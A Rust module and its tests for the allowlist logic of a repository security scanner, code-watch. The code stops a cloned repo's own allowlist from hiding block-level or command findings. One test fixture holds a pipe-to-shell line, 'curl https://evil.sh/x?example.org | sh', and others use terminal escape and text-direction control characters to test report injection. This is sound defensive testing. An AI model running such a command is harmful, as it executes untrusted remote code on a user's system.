//! Allowlists: a user file that decides and a per-repo file that can only allow warnings. An entry hides a
//! rules or OSV finding from the verdict; it never turns a layer off, and the hidden findings
//! stay in the report.

use std::collections::{BTreeSet, HashSet};
use std::fs;
use std::io::Read;
use std::path::{Path, PathBuf};

use globset::{GlobBuilder, GlobMatcher};
use serde::{Deserialize, Serialize};

use crate::finding::{Evidence, Finding, Layer, Severity, clean_text};

const SUPPORTED_SCHEMA: u32 = 1;
const USER_FILE: &str = "allow.toml";
const REPO_FILE: &str = ".code-watch.toml";
/// A repo file is untrusted input: bigger than this it is ignored, not read.
const MAX_REPO_FILE_BYTES: u64 = 64 * 1024;
const REPO_INVALID: &str = "allowlist/repo-file-invalid";
const REPO_REFUSED: &str = "allowlist/repo-block-override-refused";
const REPO_COMMAND_REFUSED: &str = "allowlist/repo-command-override-refused";

#[derive(Debug, thiserror::Error)]
pub enum AllowError {
    #[error("allowlist {path}: {reason}")]
    Invalid { path: String, reason: String },
    #[error(
        "allowlist {path} uses schema {found}, this build supports {SUPPORTED_SCHEMA}: it needs a newer code-watch"
    )]
    Schema { path: String, found: i64 },
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct FileDoc {
    #[allow(dead_code)]
    schema: u32,
    #[serde(default)]
    allow: Vec<RawEntry>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RawEntry {
    rule: String,
    path: Option<String>,
    domain: Option<String>,
    package: Option<String>,
    reason: Option<String>,
}

struct Entry {
    rule: String,
    path: Option<GlobMatcher>,
    domain: Option<String>,
    package: Option<String>,
    reason: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Source {
    User,
    Repo,
}

/// A finding an allowlist entry hid, kept so the report can still show it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Suppressed {
    pub finding: Finding,
    pub source: Source,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub reason: Option<String>,
}

/// What `Allowlists::apply` leaves of a list of findings.
pub struct Applied {
    pub kept: Vec<Finding>,
    pub suppressed: Vec<Suppressed>,
    pub warnings: Vec<String>,
}

#[derive(Default)]
pub struct Allowlists {
    user: Vec<Entry>,
    repo: Vec<Entry>,
    user_path: String,
    repo_problem: Option<String>,
}

impl Allowlists {
    pub fn empty() -> Self {
        Self::default()
    }

    /// Loads `<user_dir>/code-watch/allow.toml` and `<repo_root>/.code-watch.toml`; a missing
    /// file is an empty list. A broken user file is an error. A broken repo file is dropped and
    /// reported as a finding, because a cloned repo must not be able to stop the scan.
    pub fn load(user_dir: Option<&Path>, repo_root: Option<&Path>) -> Result<Self, AllowError> {
        let mut lists = Self::default();
        if let Some(dir) = user_dir {
            let path = dir.join("code-watch").join(USER_FILE);
            lists.user_path = path.display().to_string();
            match fs::read_to_string(&path) {
                Ok(text) => lists.user = parse(&text, &lists.user_path)?,
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
                Err(e) => {
                    return Err(AllowError::Invalid {
                        path: lists.user_path,
                        reason: e.to_string(),
                    });
                }
            }
        }
        if let Some(root) = repo_root {
            match read_repo_file(&root.join(REPO_FILE)) {
                Ok(Some(entries)) => lists.repo = entries,
                Ok(None) => {}
                Err(problem) => lists.repo_problem = Some(problem),
            }
        }
        Ok(lists)
    }

    /// Splits `findings` into kept and suppressed. Only rules and OSV findings are suppressible;
    /// the engine's own `allowlist/*` findings never are. `known_ids` are the rule ids this build
    /// has, so a stale entry is a warning rather than an error.
    pub fn apply(&self, findings: Vec<Finding>, known_ids: &HashSet<String>) -> Applied {
        let mut kept = Vec::new();
        let mut suppressed = Vec::new();
        let mut refused = BTreeSet::new();
        let mut command_refused = BTreeSet::new();
        for f in findings {
            match self.decide(&f) {
                Decision::Keep => kept.push(f),
                Decision::Refuse => {
                    refused.insert(f.rule_id.clone());
                    kept.push(f);
                }
                Decision::RefuseCommand => {
                    command_refused.insert(f.rule_id.clone());
                    kept.push(f);
                }
                Decision::Suppress(source, reason) => suppressed.push(Suppressed {
                    finding: f,
                    source,
                    reason,
                }),
            }
        }
        kept.extend(refused.iter().map(|id| refusal(id)));
        kept.extend(command_refused.iter().map(|id| command_refusal(id)));
        kept.extend(self.repo_problem.iter().map(|p| repo_invalid(p)));
        let mut warnings = Vec::new();
        for (entries, file) in [
            (&self.user, self.user_path.as_str()),
            (&self.repo, REPO_FILE),
        ] {
            for e in entries.iter().filter(|e| !known_ids.contains(&e.rule)) {
                warnings.push(format!("unknown rule id {:?} in {file}", e.rule));
            }
        }
        Applied {
            kept,
            suppressed,
            warnings,
        }
    }

    fn decide(&self, f: &Finding) -> Decision {
        if !suppressible(f) {
            return Decision::Keep;
        }
        if let Some(e) = self.user.iter().find(|e| e.matches(f)) {
            return Decision::Suppress(Source::User, e.reason.clone());
        }
        let Some(e) = self.repo.iter().find(|e| e.matches(f)) else {
            return Decision::Keep;
        };
        // A repo file is writable by the agent being guarded, so it never allows a command rule.
        if f.rule_id.starts_with("command/") {
            Decision::RefuseCommand
        } else if f.severity < Severity::Block {
            Decision::Suppress(Source::Repo, e.reason.clone())
        } else {
            Decision::Refuse
        }
    }
}

enum Decision {
    Keep,
    Refuse,
    RefuseCommand,
    Suppress(Source, Option<String>),
}

fn suppressible(f: &Finding) -> bool {
    matches!(f.layer, Layer::Rules | Layer::Osv | Layer::Download)
        && !f.rule_id.starts_with("allowlist/")
        && f.rule_id != "repo/unscanned-target"
        && f.rule_id != crate::osv::RULE_UNPARSED
        && f.rule_id != crate::osv::RULE_UNCHECKED
}

impl Entry {
    /// Every narrower the entry has must match; a finding without the field never matches it.
    fn matches(&self, f: &Finding) -> bool {
        self.rule == f.rule_id
            && self.path.as_ref().is_none_or(|g| {
                f.evidence
                    .file
                    .as_deref()
                    .is_some_and(|file| g.is_match(file))
            })
            && same(self.domain.as_deref(), f.domain.as_deref())
            && same(self.package.as_deref(), f.package.as_deref())
    }
}

fn same(wanted: Option<&str>, found: Option<&str>) -> bool {
    match wanted {
        None => true,
        Some(w) => found.is_some_and(|f| {
            f.trim_end_matches('.')
                .eq_ignore_ascii_case(w.trim_end_matches('.'))
        }),
    }
}

fn parse(text: &str, path: &str) -> Result<Vec<Entry>, AllowError> {
    let invalid = |reason: String| AllowError::Invalid {
        path: path.into(),
        reason,
    };
    let table: toml::Table = text.parse().map_err(|e| invalid(format!("{e}")))?;
    match table.get("schema") {
        Some(toml::Value::Integer(n)) if *n == i64::from(SUPPORTED_SCHEMA) => {}
        Some(toml::Value::Integer(n)) => {
            return Err(AllowError::Schema {
                path: path.into(),
                found: *n,
            });
        }
        _ => return Err(invalid("missing `schema = 1`".into())),
    }
    let doc: FileDoc = table.try_into().map_err(|e| invalid(format!("{e}")))?;
    doc.allow
        .into_iter()
        .map(|raw| {
            let path_matcher = raw
                .path
                .as_deref()
                .map(|p| {
                    GlobBuilder::new(p)
                        .literal_separator(true)
                        .build()
                        .map(|g| g.compile_matcher())
                        .map_err(|e| invalid(format!("path {p:?}: {e}")))
                })
                .transpose()?;
            Ok(Entry {
                rule: raw.rule,
                path: path_matcher,
                domain: raw.domain,
                package: raw.package,
                reason: raw.reason.as_deref().map(clean_text),
            })
        })
        .collect()
}

/// Opens without following a symlink and without blocking on a FIFO, so a file swapped in after
/// any earlier check cannot be followed or hang the scan.
fn open_untrusted(path: &Path) -> std::io::Result<fs::File> {
    let mut options = fs::OpenOptions::new();
    options.read(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK);
    }
    options.open(path)
}

/// `Ok(None)` when there is no file. The file is read only if the opened handle is a regular
/// file (never a symlink) and at most `MAX_REPO_FILE_BYTES` long; every other outcome is a
/// problem text for the report.
fn read_repo_file(path: &Path) -> Result<Option<Vec<Entry>>, String> {
    let file = match open_untrusted(path) {
        Ok(f) => f,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(e) => return Err(format!("cannot be opened (symlinks are not followed): {e}")),
    };
    let is_file = file.metadata().is_ok_and(|m| m.is_file());
    if !is_file {
        return Err("is not a regular file".into());
    }
    let mut bytes = Vec::new();
    file.take(MAX_REPO_FILE_BYTES + 1)
        .read_to_end(&mut bytes)
        .map_err(|e| format!("cannot be read: {e}"))?;
    if bytes.len() as u64 > MAX_REPO_FILE_BYTES {
        return Err(format!("is larger than {MAX_REPO_FILE_BYTES} bytes"));
    }
    let text = String::from_utf8(bytes).map_err(|_| "is not valid UTF-8".to_string())?;
    parse(&text, REPO_FILE).map(Some).map_err(|e| e.to_string())
}

fn repo_invalid(problem: &str) -> Finding {
    own_finding(
        REPO_INVALID,
        "The repository's allowlist file was ignored",
        &format!("{REPO_FILE} {problem}"),
        "Fix or remove the file; nothing in it was applied.",
    )
}

fn command_refusal(rule_id: &str) -> Finding {
    own_finding(
        REPO_COMMAND_REFUSED,
        "The repository's allowlist asked to allow a command rule",
        &format!("{REPO_FILE} tried to allow {rule_id}"),
        "Only the user's own code-watch settings can allow command rules.",
    )
}

fn refusal(rule_id: &str) -> Finding {
    own_finding(
        REPO_REFUSED,
        "The repository's allowlist asked to allow a block rule the user file does not list",
        &format!("{REPO_FILE} tried to allow {rule_id}"),
        "Only the user's own code-watch settings can allow this rule.",
    )
}

fn own_finding(id: &str, title: &str, excerpt: &str, remediation: &str) -> Finding {
    Finding {
        rule_id: id.into(),
        severity: Severity::Warn,
        layer: Layer::Rules,
        title: title.into(),
        evidence: Evidence::new(Some(REPO_FILE.into()), None, excerpt),
        remediation: remediation.into(),
        domain: None,
        package: None,
        advisories: Vec::new(),
    }
}

/// The nearest directory at or above `start` holding a `.git` entry (a directory, or a file
/// for worktrees and submodules).
pub fn find_repo_root(start: &Path) -> Option<PathBuf> {
    start
        .ancestors()
        .find(|dir| dir.join(".git").symlink_metadata().is_ok())
        .map(Path::to_path_buf)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn finding(id: &str, severity: Severity) -> Finding {
        Finding {
            rule_id: id.into(),
            severity,
            layer: Layer::Rules,
            title: String::new(),
            evidence: Evidence::new(Some("a/package.json".into()), Some(1), "x"),
            remediation: String::new(),
            domain: None,
            package: None,
            advisories: Vec::new(),
        }
    }

    fn entries(toml_body: &str) -> Vec<Entry> {
        parse(&format!("schema = 1\n{toml_body}"), "t").unwrap()
    }

    fn lists(user: &str, repo: &str) -> Allowlists {
        Allowlists {
            user: entries(user),
            repo: entries(repo),
            ..Allowlists::default()
        }
    }

    fn known(ids: &[&str]) -> HashSet<String> {
        ids.iter().map(|s| s.to_string()).collect()
    }

    fn ids(findings: &[Finding]) -> Vec<&str> {
        findings.iter().map(|f| f.rule_id.as_str()).collect()
    }

    const ALLOW_W: &str = "[[allow]]\nrule = \"w\"\n";
    const ALLOW_B: &str = "[[allow]]\nrule = \"b\"\n";

    #[test]
    fn no_files_suppress_nothing() {
        let dir = tempfile::tempdir().unwrap();
        let l = Allowlists::load(Some(dir.path()), Some(dir.path())).unwrap();
        let a = l.apply(vec![finding("w", Severity::Warn)], &known(&["w"]));
        assert_eq!(ids(&a.kept), ["w"]);
        assert!(a.suppressed.is_empty() && a.warnings.is_empty());
    }

    fn write_user(dir: &Path, text: &str) {
        fs::create_dir_all(dir.join("code-watch")).unwrap();
        fs::write(dir.join("code-watch").join(USER_FILE), text).unwrap();
    }

    fn user_error(text: &str) -> String {
        let dir = tempfile::tempdir().unwrap();
        write_user(dir.path(), text);
        match Allowlists::load(Some(dir.path()), None) {
            Err(e) => e.to_string(),
            Ok(_) => panic!("expected an error"),
        }
    }

    #[test]
    fn a_malformed_user_file_is_an_error_naming_the_file() {
        assert!(user_error("schema = 1\n[[allow").contains("allow.toml"));
    }

    #[test]
    fn an_unknown_key_in_the_user_file_is_an_error() {
        let e = user_error("schema = 1\n[[allow]]\nrule = \"w\"\nrulez = \"x\"\n");
        assert!(e.contains("rulez"), "{e}");
        assert!(user_error("schema = 1\nbogus = 1\n").contains("bogus"));
    }

    #[test]
    fn a_newer_schema_is_an_error_even_with_keys_this_build_does_not_know() {
        let e = user_error("schema = 2\n[[allow]]\nrule = \"w\"\nfuture = true\n");
        assert!(e.contains("schema 2") && e.contains("newer"), "{e}");
    }

    #[test]
    fn a_user_file_without_schema_is_an_error() {
        assert!(user_error("[[allow]]\nrule = \"w\"\n").contains("schema"));
    }

    #[test]
    fn a_bad_path_glob_is_an_error() {
        assert!(user_error("schema = 1\n[[allow]]\nrule = \"w\"\npath = \"[\"\n").contains("path"));
    }

    #[test]
    fn the_user_file_allows_any_rule_including_block() {
        let a = lists(&format!("{ALLOW_W}{ALLOW_B}"), "").apply(
            vec![finding("w", Severity::Warn), finding("b", Severity::Block)],
            &known(&["w", "b"]),
        );
        assert!(a.kept.is_empty());
        assert!(a.suppressed.iter().all(|s| s.source == Source::User));
        assert_eq!(a.suppressed.len(), 2);
    }

    #[test]
    fn the_repo_file_allows_a_warn_rule_and_the_finding_stays_listed() {
        let a = lists("", ALLOW_W).apply(vec![finding("w", Severity::Warn)], &known(&["w"]));
        assert!(a.kept.is_empty());
        assert_eq!(a.suppressed[0].source, Source::Repo);
        assert_eq!(a.suppressed[0].finding.rule_id, "w");
    }

    #[test]
    fn the_repo_file_cannot_allow_a_block_rule_the_user_file_does_not_list() {
        let a = lists("", ALLOW_B).apply(vec![finding("b", Severity::Block)], &known(&["b"]));
        assert_eq!(ids(&a.kept), ["b", REPO_REFUSED]);
        assert!(a.suppressed.is_empty());
        assert!(a.kept[1].evidence.excerpt.contains("tried to allow b"));
    }

    #[test]
    fn the_refusal_is_one_finding_per_rule_however_many_hits() {
        let a = lists("", ALLOW_B).apply(
            vec![finding("b", Severity::Block), finding("b", Severity::Block)],
            &known(&["b"]),
        );
        assert_eq!(ids(&a.kept), ["b", "b", REPO_REFUSED]);
    }

    #[test]
    fn a_user_entry_that_matches_the_finding_lifts_a_block_whatever_the_repo_says() {
        let a = lists(ALLOW_B, ALLOW_B).apply(vec![finding("b", Severity::Block)], &known(&["b"]));
        assert!(a.kept.is_empty());
        assert_eq!(a.suppressed[0].source, Source::User);
    }

    #[test]
    fn a_user_entry_narrowed_to_another_domain_does_not_back_a_repo_entry() {
        let user = "[[allow]]\nrule = \"b\"\ndomain = \"githuh.com\"\n";
        let mut f = finding("b", Severity::Block);
        f.domain = Some("evil.io".into());
        let a = lists(user, ALLOW_B).apply(vec![f], &known(&["b"]));
        assert_eq!(ids(&a.kept), ["b", REPO_REFUSED]);
        assert!(a.suppressed.is_empty());
    }

    const ALLOW_CMD: &str = "[[allow]]\nrule = \"command/x\"\n";

    #[test]
    fn a_repo_entry_never_allows_a_command_rule_and_the_attempt_is_reported() {
        for severity in [Severity::Warn, Severity::Block] {
            let a = lists("", ALLOW_CMD)
                .apply(vec![finding("command/x", severity)], &known(&["command/x"]));
            assert_eq!(
                ids(&a.kept),
                ["command/x", REPO_COMMAND_REFUSED],
                "{severity:?}"
            );
            assert!(a.suppressed.is_empty());
        }
    }

    #[test]
    fn a_repo_file_listing_a_command_rule_adds_nothing_when_no_finding_matches() {
        let a = lists("", ALLOW_CMD).apply(vec![], &known(&["command/x"]));
        assert!(a.kept.is_empty());
    }

    #[test]
    fn the_user_file_still_allows_a_command_rule() {
        let a = lists(ALLOW_CMD, ALLOW_CMD).apply(
            vec![finding("command/x", Severity::Warn)],
            &known(&["command/x"]),
        );
        assert!(a.kept.is_empty());
        assert_eq!(a.suppressed[0].source, Source::User);
    }

    #[test]
    fn a_block_severity_finding_of_a_warn_rule_id_is_judged_by_the_finding() {
        let a = lists("", ALLOW_W).apply(vec![finding("w", Severity::Block)], &known(&["w"]));
        assert_eq!(ids(&a.kept), ["w", REPO_REFUSED]);
    }

    #[test]
    fn the_path_narrower_matches_inside_and_not_outside() {
        let user = "[[allow]]\nrule = \"w\"\npath = \"a/*.json\"\n";
        let mut outside = finding("w", Severity::Warn);
        outside.evidence = Evidence::new(Some("b/package.json".into()), None, "");
        let a = lists(user, "").apply(vec![finding("w", Severity::Warn), outside], &known(&["w"]));
        assert_eq!(a.suppressed.len(), 1);
        assert_eq!(a.kept[0].evidence.file.as_deref(), Some("b/package.json"));
    }

    #[test]
    fn a_star_in_a_path_glob_does_not_cross_a_slash() {
        let user = "[[allow]]\nrule = \"w\"\npath = \"*.json\"\n";
        let a = lists(user, "").apply(vec![finding("w", Severity::Warn)], &known(&["w"]));
        assert_eq!(a.kept.len(), 1);
        let user = "[[allow]]\nrule = \"w\"\npath = \"**/*.json\"\n";
        let a = lists(user, "").apply(vec![finding("w", Severity::Warn)], &known(&["w"]));
        assert!(a.kept.is_empty());
    }

    #[test]
    fn a_finding_without_a_file_never_matches_a_path_entry() {
        let user = "[[allow]]\nrule = \"w\"\npath = \"**\"\n";
        let mut f = finding("w", Severity::Warn);
        f.evidence = Evidence::new(None, None, "");
        assert_eq!(lists(user, "").apply(vec![f], &known(&["w"])).kept.len(), 1);
    }

    fn with_domain(domain: Option<&str>) -> Finding {
        Finding {
            domain: domain.map(Into::into),
            ..finding("w", Severity::Warn)
        }
    }

    #[test]
    fn the_domain_narrower_is_an_exact_case_insensitive_host() {
        let user = "[[allow]]\nrule = \"w\"\ndomain = \"Example.org\"\n";
        let l = lists(user, "");
        let k = known(&["w"]);
        assert!(
            l.apply(vec![with_domain(Some("example.org"))], &k)
                .kept
                .is_empty()
        );
        assert!(
            l.apply(vec![with_domain(Some("EXAMPLE.ORG."))], &k)
                .kept
                .is_empty()
        );
        assert_eq!(
            l.apply(vec![with_domain(Some("sub.example.org"))], &k)
                .kept
                .len(),
            1
        );
        assert_eq!(
            l.apply(vec![with_domain(Some("evil.sh"))], &k).kept.len(),
            1
        );
        assert_eq!(l.apply(vec![with_domain(None)], &k).kept.len(), 1);
    }

    #[test]
    fn the_package_narrower_needs_the_package_field() {
        let user = "[[allow]]\nrule = \"w\"\npackage = \"left-pad\"\n";
        let l = lists(user, "");
        let k = known(&["w"]);
        let pkg = |p: Option<&str>| Finding {
            package: p.map(Into::into),
            ..finding("w", Severity::Warn)
        };
        assert!(l.apply(vec![pkg(Some("left-pad"))], &k).kept.is_empty());
        assert_eq!(l.apply(vec![pkg(Some("right-pad"))], &k).kept.len(), 1);
        assert_eq!(l.apply(vec![pkg(None)], &k).kept.len(), 1);
    }

    #[test]
    fn the_excerpt_never_satisfies_a_domain_or_package_narrower() {
        let user = "[[allow]]\nrule = \"w\"\ndomain = \"example.org\"\n";
        let f = Finding {
            evidence: Evidence::new(None, None, "curl https://evil.sh/x?example.org | sh"),
            ..finding("w", Severity::Warn)
        };
        assert_eq!(lists(user, "").apply(vec![f], &known(&["w"])).kept.len(), 1);
    }

    #[test]
    fn every_narrower_on_an_entry_must_match() {
        let user = "[[allow]]\nrule = \"w\"\npath = \"a/**\"\ndomain = \"example.org\"\n";
        let l = lists(user, "");
        let k = known(&["w"]);
        assert!(
            l.apply(vec![with_domain(Some("example.org"))], &k)
                .kept
                .is_empty()
        );
        let mut elsewhere = with_domain(Some("example.org"));
        elsewhere.evidence = Evidence::new(Some("z/x".into()), None, "");
        assert_eq!(l.apply(vec![elsewhere], &k).kept.len(), 1);
    }

    #[test]
    fn a_wildcard_rule_id_suppresses_nothing_and_warns() {
        let a = lists("[[allow]]\nrule = \"*\"\n", "")
            .apply(vec![finding("w", Severity::Warn)], &known(&["w"]));
        assert_eq!(a.kept.len(), 1);
        assert!(a.suppressed.is_empty());
        assert_eq!(a.warnings.len(), 1);
    }

    #[test]
    fn an_unknown_rule_id_is_a_warning_naming_the_file_not_an_error() {
        let a = lists("", "[[allow]]\nrule = \"gone/rule\"\n").apply(vec![], &known(&["w"]));
        assert_eq!(
            a.warnings,
            ["unknown rule id \"gone/rule\" in .code-watch.toml"]
        );
    }

    #[test]
    fn the_engines_own_findings_and_other_layers_are_never_suppressed() {
        let user = "[[allow]]\nrule = \"allowlist/repo-file-invalid\"\n\
                    [[allow]]\nrule = \"repo/unscanned-target\"\n[[allow]]\nrule = \"llm/x\"\n";
        let mut llm = finding("llm/x", Severity::Warn);
        llm.layer = Layer::Llm;
        let a = lists(user, "").apply(
            vec![
                finding("allowlist/repo-file-invalid", Severity::Warn),
                finding("repo/unscanned-target", Severity::Warn),
                llm,
            ],
            &known(&["repo/unscanned-target", "llm/x"]),
        );
        assert_eq!(a.kept.len(), 3);
        assert!(a.suppressed.is_empty());
    }

    #[test]
    fn a_download_finding_can_be_allowed() {
        let mut d = finding("download/x", Severity::Block);
        d.layer = Layer::Download;
        let a =
            lists("[[allow]]\nrule = \"download/x\"\n", "").apply(vec![d], &known(&["download/x"]));
        assert!(a.kept.is_empty());
        assert_eq!(a.suppressed.len(), 1);
    }

    #[test]
    fn an_osv_finding_can_be_allowed() {
        let mut osv = finding("osv/x", Severity::Warn);
        osv.layer = Layer::Osv;
        let a = lists("[[allow]]\nrule = \"osv/x\"\n", "").apply(vec![osv], &known(&["osv/x"]));
        assert!(a.kept.is_empty());
    }

    fn repo_with(body: &[u8]) -> tempfile::TempDir {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join(REPO_FILE), body).unwrap();
        dir
    }

    fn load_repo(dir: &Path) -> Applied {
        Allowlists::load(None, Some(dir))
            .unwrap()
            .apply(vec![finding("w", Severity::Warn)], &known(&["w"]))
    }

    #[test]
    fn a_repo_file_is_read_from_the_root() {
        let dir = repo_with(b"schema = 1\n[[allow]]\nrule = \"w\"\n");
        assert!(load_repo(dir.path()).kept.is_empty());
    }

    #[test]
    fn a_malformed_repo_file_is_ignored_with_a_finding() {
        let dir = repo_with(b"schema = 1\n[[allow]]\nrule = \"w\"\nbogus = 1\n");
        let a = load_repo(dir.path());
        assert_eq!(ids(&a.kept), ["w", REPO_INVALID]);
        assert!(a.suppressed.is_empty());
    }

    #[test]
    fn a_newer_schema_repo_file_is_ignored_with_a_finding() {
        let dir = repo_with(b"schema = 9\n");
        assert_eq!(ids(&load_repo(dir.path()).kept), ["w", REPO_INVALID]);
    }

    #[test]
    fn a_huge_repo_file_is_ignored_without_being_read() {
        let mut body = b"schema = 1\n[[allow]]\nrule = \"w\"\n#".to_vec();
        body.resize(MAX_REPO_FILE_BYTES as usize + 1, b'x');
        let dir = repo_with(&body);
        let a = load_repo(dir.path());
        assert_eq!(ids(&a.kept), ["w", REPO_INVALID]);
        assert!(a.kept[1].evidence.excerpt.contains("larger"));
    }

    #[cfg(unix)]
    #[test]
    fn a_symlinked_repo_file_is_not_followed() {
        let outside = repo_with(b"schema = 1\n[[allow]]\nrule = \"w\"\n");
        let repo = tempfile::tempdir().unwrap();
        std::os::unix::fs::symlink(outside.path().join(REPO_FILE), repo.path().join(REPO_FILE))
            .unwrap();
        let a = load_repo(repo.path());
        assert_eq!(ids(&a.kept), ["w", REPO_INVALID]);
        assert!(a.kept[1].evidence.excerpt.contains("symlink"));
    }

    #[cfg(unix)]
    #[test]
    fn a_fifo_named_like_the_repo_file_is_ignored_and_does_not_hang() {
        use std::os::unix::ffi::OsStrExt;
        let dir = tempfile::tempdir().unwrap();
        let path =
            std::ffi::CString::new(dir.path().join(REPO_FILE).as_os_str().as_bytes()).unwrap();
        assert_eq!(unsafe { libc::mkfifo(path.as_ptr(), 0o600) }, 0);
        let a = load_repo(dir.path());
        assert_eq!(ids(&a.kept), ["w", REPO_INVALID]);
        assert!(a.kept[1].evidence.excerpt.contains("not a regular file"));
    }

    #[test]
    fn a_file_of_exactly_the_cap_is_read_and_one_byte_more_is_not() {
        let mut body = b"schema = 1\n[[allow]]\nrule = \"w\"\n#".to_vec();
        body.resize(MAX_REPO_FILE_BYTES as usize, b'x');
        assert!(load_repo(repo_with(&body).path()).kept.is_empty());
        body.push(b'x');
        assert_eq!(
            ids(&load_repo(repo_with(&body).path()).kept),
            ["w", REPO_INVALID]
        );
    }

    #[test]
    fn text_from_a_hostile_repo_file_reaches_the_report_without_control_characters() {
        let dir = repo_with(
            "schema = 1\n[[allow]]\nrule = \"gone\\u001b[2J\\u202e\"\nreason = \"a\\u001b[31m\\u202eb\"\n\
             [[allow]]\nrule = \"w\"\nreason = \"x\\u001b[31m\\u202ey\"\n"
                .as_bytes(),
        );
        let a = load_repo(dir.path());
        let reason = a.suppressed[0].reason.as_deref().unwrap();
        assert_eq!(reason, "x?[31m?y");
        assert!(
            a.warnings[0]
                .chars()
                .all(|c| !c.is_control() && c != '\u{202e}'),
            "{}",
            a.warnings[0]
        );
        let broken = repo_with(b"schema = 1\n[[allow]]\nrule = \"w\"\n\x1b[31mbogus\x1b = 1\n");
        let a = load_repo(broken.path());
        assert_eq!(a.kept[1].rule_id, REPO_INVALID);
        assert!(a.kept[1].evidence.excerpt.chars().all(|c| !c.is_control()));
    }

    #[test]
    fn the_user_file_is_read_from_the_injected_dir() {
        let dir = tempfile::tempdir().unwrap();
        write_user(
            dir.path(),
            "schema = 1\n[[allow]]\nrule = \"w\"\nreason = \"ok\"\n",
        );
        let a = Allowlists::load(Some(dir.path()), None)
            .unwrap()
            .apply(vec![finding("w", Severity::Warn)], &known(&["w"]));
        assert_eq!(a.suppressed[0].reason.as_deref(), Some("ok"));
    }

    #[test]
    fn repo_discovery_finds_a_git_directory_or_a_git_file() {
        let dir = tempfile::tempdir().unwrap();
        let sub = dir.path().join("a/b");
        fs::create_dir_all(&sub).unwrap();
        assert_eq!(
            find_repo_root(&sub).filter(|p| p.starts_with(dir.path())),
            None
        );
        fs::write(dir.path().join("a/.git"), "gitdir: ../x\n").unwrap();
        assert_eq!(find_repo_root(&sub), Some(dir.path().join("a")));
        fs::create_dir(dir.path().join("a/b/.git")).unwrap();
        assert_eq!(find_repo_root(&sub), Some(sub));
    }
}
